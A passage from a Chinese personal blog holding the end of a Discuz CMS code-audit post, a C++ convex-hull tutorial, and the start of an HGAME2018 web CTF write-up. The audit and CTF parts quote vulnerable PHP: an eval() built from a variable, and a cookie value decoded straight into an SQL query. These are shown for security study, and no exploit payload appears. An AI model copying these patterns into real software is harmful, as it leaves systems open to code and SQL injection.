@fopen($scheme.<span class="string">'://'</span>.($ip ? $ip : $host).<span class="string">':'</span>.$port.$path, <span class="string">'b'</span>, <span class="keyword">false</span>, $context);</span><br><span class="line">		$fpflag = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!$fp) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		stream_set_blocking($fp, $block);</span><br><span class="line">		stream_set_timeout($fp, $timeout);</span><br><span class="line">		@fwrite($fp, $out);</span><br><span class="line">		$status = stream_get_meta_data($fp);</span><br><span class="line">		<span class="keyword">if</span>(!$status[<span class="string">'timed_out'</span>]) &#123;</span><br><span class="line">			<span class="keyword">while</span> (!feof($fp) &amp;&amp; !$fpflag) &#123;</span><br><span class="line">				<span class="keyword">if</span>(($header = @fgets($fp)) &amp;&amp; ($header == <span class="string">"\r\n"</span> ||  $header == <span class="string">"\n"</span>)) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$stop = <span class="keyword">false</span>;</span><br><span class="line">			<span class="keyword">while</span>(!feof($fp) &amp;&amp; !$stop) &#123;</span><br><span class="line">				$data = fread($fp, ($limit == <span class="number">0</span> || $limit &gt; <span class="number">8192</span> ? <span class="number">8192</span> : $limit));</span><br><span class="line">				$return .= $data;</span><br><span class="line">				<span class="keyword">if</span>($limit) &#123;</span><br><span class="line">					$limit -= strlen($data);</span><br><span class="line">					$stop = $limit &lt;= <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		@fclose($fp);</span><br><span class="line">		<span class="keyword">return</span> $return;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>–tips PHP相关函数科普<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">parse_url():返回url的组成部分。</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(parse_url(<span class="string">'http://php.net/manual/zh/function.parse-url.php'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; php.net</span><br><span class="line">    [path] =&gt; /manual/zh/<span class="function"><span class="keyword">function</span>.<span class="title">parse</span>-<span class="title">url</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"><span class="title">stream_set_blocking</span><span class="params">()</span>:为<span class="title">PHP</span>资源流设置阻塞；</span></span><br><span class="line"><span class="function"><span class="title">stream_set_timeout</span><span class="params">()</span>:当流超时时，由<span class="title">stream_get_meta_data</span>（）返回的数组的'<span class="title">timed_out</span>'键 被设置为<span class="title">TRUE</span>，尽管没有生成错误/警告。</span></span><br></pre></td></tr></table></figure></p>
<p>首先通过url_parse()函数获取相关信息，然后调用fsocketopenz()这个函数来进行初步文件写入操作（$fp）。<br>如果$fp为空，直接返回空，反之，对网页进行写入然后返回。</p>
<h5 id="function-uc-api-mysql"><a href="#function-uc-api-mysql" class="headerlink" title="function uc_api_mysql()"></a>function uc_api_mysql()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_api_mysql</span><span class="params">($model, $action, $args=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $uc_controls;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($uc_controls[$model])) &#123;</span><br><span class="line">		<span class="keyword">if</span>(function_exists(<span class="string">"mysql_connect"</span>)) &#123;</span><br><span class="line">			<span class="keyword">include_once</span> UC_ROOT.<span class="string">'./lib/db.class.php'</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">include_once</span> UC_ROOT.<span class="string">'./lib/dbi.class.php'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">include_once</span> UC_ROOT.<span class="string">'./model/base.php'</span>;</span><br><span class="line">		<span class="keyword">include_once</span> UC_ROOT.<span class="string">"./control/$model.php"</span>;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="string">"\$uc_controls['$model'] = new &#123;$model&#125;control();"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($action&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span>) &#123;</span><br><span class="line">		$args = uc_addslashes($args, <span class="number">1</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">		$action = <span class="string">'on'</span>.$action;</span><br><span class="line">		$uc_controls[$model]-&gt;input = $args;</span><br><span class="line">		<span class="keyword">return</span> $uc_controls[$model]-&gt;$action($args);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个实际上是一个数据库函数。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/03/09/DiscuzCMS-代码审计-更新ing/" data-id="cjk0t3ve200089cv4i5y6fiol" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-浅谈凸包算法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/05/浅谈凸包算法/" class="article-date">
  <time datetime="2018-03-05T12:23:18.000Z" itemprop="datePublished">2018-03-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Algorithm/">Algorithm</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/05/浅谈凸包算法/">浅谈凸包算法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>先前在算法分析A的第二期题库里遇到了凸包算法这个问题，当时找了一些视频和资料进行相关学习后解决了那个题，但是私以为自己对于凸包算法的学习仍然停留在一个很浅的层面上，所以今天打算重新学习，加深自己对于凸包算法的理解。</p>
<h2 id="如何定义凸包"><a href="#如何定义凸包" class="headerlink" title="如何定义凸包"></a>如何定义凸包</h2><p>在一个实数向量空间 {\displaystyle V} V中，对于给定集合 {\displaystyle X} X，所有包含X的凸集的交集 {\displaystyle S} S被称为 {\displaystyle X} X的凸包。<br><img src="https://upload.wikimedia.org/wikipedia/commons/b/bc/ConvexHull.png" alt=""></p>
<h2 id="凸包算法中涉及到的平面几何"><a href="#凸包算法中涉及到的平面几何" class="headerlink" title="凸包算法中涉及到的平面几何"></a>凸包算法中涉及到的平面几何</h2><p>首先定义二维向量<x1,y1>和<x2,y2>的叉积为一个实数Cp=x1<em>y2-x2</em>y1。<br>1.叉积的一半是一个三角形的有向面积；<br>2.向量的叉积的符号代表着向量旋转的方向。<br>向量的叉积是不满足交换律的，向量A乘以向量B，如果为正则为A逆时针旋转向B 否则为顺时针。<br>在代码描述的过程中采用逆时针来判断该点是否可以加入点集。</x2,y2></x1,y1></p>
<h2 id="平面点集凸包的算法"><a href="#平面点集凸包的算法" class="headerlink" title="平面点集凸包的算法"></a>平面点集凸包的算法</h2><p>这里主要讲Graham扫描法，其时间复杂度是O(nlogn)。<br>关于Graham扫描法，必须明确以下几点基本操作：<br>1.找到横坐标最小的点，如果x存在相同的情况，那么就找到y轴最小的点，然后把这个点作为基点；<br>2.计算出各点与基点的向量，然后进行排序；<br>3.删除在同一线上的点；<br>4.找到所有的极点放进vector；<br>5.取出vector中的向量进行计算。</p>
<h2 id="算法实战"><a href="#算法实战" class="headerlink" title="算法实战"></a>算法实战</h2><p>1.找基点<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">node minn;</span><br><span class="line">int <span class="attribute">minid</span>=-1;</span><br><span class="line">minn.<span class="attribute">x</span>=INF;</span><br><span class="line">minn.<span class="attribute">y</span>=INF;</span><br><span class="line"><span class="keyword">for</span>(int <span class="attribute">i</span>=0; i&lt;n; i++)</span><br><span class="line"><span class="keyword">if</span>(minn.x&gt;Pos[i].x || minn.<span class="attribute">x</span>==Pos[i].x&amp;&amp;minn.y&gt;Pos[i].y)</span><br><span class="line">&#123;</span><br><span class="line">    minn.<span class="attribute">x</span>=Pos[i].x;</span><br><span class="line">    minn.<span class="attribute">y</span>=Pos[i].y;</span><br><span class="line">    <span class="attribute">minid</span>=i;</span><br><span class="line">&#125;</span><br><span class="line">swap(Pos[minid],Pos[0]);</span><br></pre></td></tr></table></figure></p>
<p>找到最小的点和初始点（0点）交换位置，让其作为基点。</p>
<p>2.按从小到大的顺序<br>自定义sort排序<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node p1,node p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x1=p1.x-Pos[<span class="number">0</span>].x;</span><br><span class="line">    <span class="keyword">int</span> y1=p1.y-Pos[<span class="number">0</span>].y;</span><br><span class="line">    <span class="keyword">int</span> x2=p2.x-Pos[<span class="number">0</span>].x;</span><br><span class="line">    <span class="keyword">int</span> y2=p2.y-Pos[<span class="number">0</span>].y;</span><br><span class="line">    <span class="keyword">int</span> s=x1*y2-x2*y1;</span><br><span class="line">    <span class="keyword">if</span>(s&gt;<span class="number">0</span> || s==<span class="number">0</span> &amp;&amp; <span class="built_in">pow</span>(x1,<span class="number">2</span>)+<span class="built_in">pow</span>(y1,<span class="number">2</span>)&gt;<span class="built_in">pow</span>(x2,<span class="number">2</span>)+<span class="built_in">pow</span>(y2,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>算出两个点和基点的向量，然后计算叉积，因为是根据逆时针来寻找点，所以必须满足叉积(s)大于0，如果叉积等于0的情况下，那就判断向量的模长，取最大的。</p>
<p>3.删除同一条线上的点<br>同一条线上的点不需要进行计算，作为凸包的边即可，判断是否在同一条边上，以及计算面积的大小都可以用这个式子来进行判断。<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int dig(node <span class="keyword">x</span><span class="number">0</span>,node <span class="keyword">x</span><span class="number">1</span>,node <span class="keyword">x</span><span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    return (<span class="keyword">x</span><span class="number">2</span>.<span class="keyword">x</span>-<span class="keyword">x</span><span class="number">0</span>.<span class="keyword">x</span>)*(<span class="keyword">x</span><span class="number">1</span>.y-<span class="keyword">x</span><span class="number">0</span>.y)-(<span class="keyword">x</span><span class="number">1</span>.<span class="keyword">x</span>-<span class="keyword">x</span><span class="number">0</span>.<span class="keyword">x</span>)*(<span class="keyword">x</span><span class="number">2</span>.y-<span class="keyword">x</span><span class="number">0</span>.y)<span class="comment">;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>把上述的判断式子带入代码中进行判断<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> num=<span class="number">2</span><span class="comment">;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span><span class="comment">;i&lt;n;i++)</span></span><br><span class="line">        <span class="keyword">if</span>(dig(<span class="keyword">Pos</span>[<span class="number">0</span>],<span class="keyword">Pos</span>[i],<span class="keyword">Pos</span>[i<span class="number">-1</span>])!=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">Pos</span>[num++]=<span class="keyword">Pos</span>[i]<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>4.找到所有极点<br>首先需要明确一个点，一个完整的凸包至少需要三个点，所以这里先将前三个点放到vector中。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">vector</span>&lt;<span class="selector-tag">node</span>&gt;<span class="selector-tag">vc</span>;</span><br><span class="line"><span class="selector-tag">vc</span><span class="selector-class">.push_back</span>(<span class="selector-tag">Pos</span><span class="selector-attr">[0]</span>);</span><br><span class="line"><span class="selector-tag">vc</span><span class="selector-class">.push_back</span>(<span class="selector-tag">Pos</span><span class="selector-attr">[1]</span>);</span><br><span class="line"><span class="selector-tag">vc</span><span class="selector-class">.push_back</span>(<span class="selector-tag">Pos</span><span class="selector-attr">[2]</span>);</span><br></pre></td></tr></table></figure></p>
<p>OK，下面开始寻找所有的极点来完成整个凸包构造。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for (<span class="name">int</span> i = <span class="number">3</span><span class="comment">; i &lt; num; i++)</span></span><br><span class="line">&#123;</span><br><span class="line">    int <span class="literal">t</span> = vc.size() - <span class="number">1</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">    while (<span class="name">vc</span>.size() &gt;= <span class="number">3</span> <span class="symbol">&amp;&amp;</span>(<span class="name">t</span> = vc.size() - <span class="number">1</span>)<span class="symbol">&amp;&amp;</span>(<span class="name">dig</span>(<span class="name">vc</span>[<span class="literal">t</span> - <span class="number">1</span>], vc[<span class="literal">t</span>], Pos[i]) &gt;= <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            vc.pop_back()<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    vc.push_back(<span class="name">Pos</span>[i])<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>5.计算凸包面积<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">while</span> (vc.<span class="built_in">size</span>() &gt;= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> t = vc.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">double</span> m = dig(vc[<span class="number">0</span>], vc[t], vc[t<span class="number">-1</span>])/<span class="number">2.0</span>;</span><br><span class="line">    <span class="built_in">if</span> (m &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        m = -m;</span><br><span class="line">    &#125;</span><br><span class="line">    ans += m;</span><br><span class="line">    vc.pop_back();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>题目来源:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>acm.swust.edu.cn<span class="regexp">/#/</span>problems<span class="regexp">/249/</span><span class="number">285</span>?_k=cro6lv</span><br></pre></td></tr></table></figure></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 110</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">&#125; Pos[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node p1,node p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x1=p1.x-Pos[<span class="number">0</span>].x;</span><br><span class="line">    <span class="keyword">int</span> y1=p1.y-Pos[<span class="number">0</span>].y;</span><br><span class="line">    <span class="keyword">int</span> x2=p2.x-Pos[<span class="number">0</span>].x;</span><br><span class="line">    <span class="keyword">int</span> y2=p2.y-Pos[<span class="number">0</span>].y;</span><br><span class="line">    <span class="keyword">int</span> s=x1*y2-x2*y1;</span><br><span class="line">    <span class="keyword">if</span>(s&gt;<span class="number">0</span> || (s==<span class="number">0</span> &amp;&amp; <span class="built_in">pow</span>(x1,<span class="number">2</span>)+<span class="built_in">pow</span>(y1,<span class="number">2</span>)&gt;<span class="built_in">pow</span>(x2,<span class="number">2</span>)+<span class="built_in">pow</span>(y2,<span class="number">2</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dig</span><span class="params">(node x0,node x1,node x2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x2.x-x0.x)*(x1.y-x0.y)-(x1.x-x0.x)*(x2.y-x0.y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;Pos[i].x, &amp;Pos[i].y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"0.0"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node minn;</span><br><span class="line">        <span class="keyword">int</span> minid = <span class="number">-1</span>;</span><br><span class="line">        minn.x = INF;</span><br><span class="line">        minn.y = INF;</span><br><span class="line">        <span class="comment">//找到最小的点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (minn.y &gt; Pos[i].y || (minn.y == Pos[i].y&amp;&amp;minn.x&gt;Pos[i].x))</span><br><span class="line">            &#123;</span><br><span class="line">                minn = Pos[i];</span><br><span class="line">                minid = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(Pos[minid], Pos[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//因为0点已经被替换为最小值，所以从1开始</span></span><br><span class="line">        sort(Pos + <span class="number">1</span>, Pos + n, cmp);</span><br><span class="line">        <span class="built_in">vector</span>&lt;node&gt;vc;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除同一条线上的点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (dig(Pos[<span class="number">0</span>], Pos[i - <span class="number">1</span>], Pos[i]) != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Pos[num++] = Pos[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vc.push_back(Pos[<span class="number">0</span>]);</span><br><span class="line">        vc.push_back(Pos[<span class="number">1</span>]);</span><br><span class="line">        vc.push_back(Pos[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//找所有极点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; num; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> t = vc.size() - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (vc.size() &gt;= <span class="number">3</span> &amp;&amp;(t = vc.size() - <span class="number">1</span>)&amp;&amp;(dig(vc[t - <span class="number">1</span>], vc[t], Pos[i]) &gt;= <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                vc.pop_back();</span><br><span class="line">            &#125;</span><br><span class="line">            vc.push_back(Pos[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (vc.size() &gt;= <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> t = vc.size() - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">double</span> m = dig(vc[<span class="number">0</span>], vc[t], vc[t<span class="number">-1</span>])/<span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">if</span> (m &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                m = -m;</span><br><span class="line">            &#125;</span><br><span class="line">            ans += m;</span><br><span class="line">            vc.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%.1lf\n"</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/03/05/浅谈凸包算法/" data-id="cjk0t3veu001h9cv4bjt4umjp" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/凸包算法/">凸包算法</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-HGAME2018-Week-3-Web-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/03/HGAME2018-Week-3-Web-Writeup/" class="article-date">
  <time datetime="2018-03-03T02:28:11.000Z" itemprop="datePublished">2018-03-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF/">CTF</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/03/HGAME2018-Week-3-Web-Writeup/">HGAME2018 Week-3 Web Writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="正常的SQLi"><a href="#正常的SQLi" class="headerlink" title="正常的SQLi"></a>正常的SQLi</h2><p>打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from user where username = '&#123;<span class="variable">$username</span>&#125;'"</span>;</span><br><span class="line"><span class="variable">$re</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$rs</span> = mysqli_fetch_array(<span class="variable">$re</span>);</span><br><span 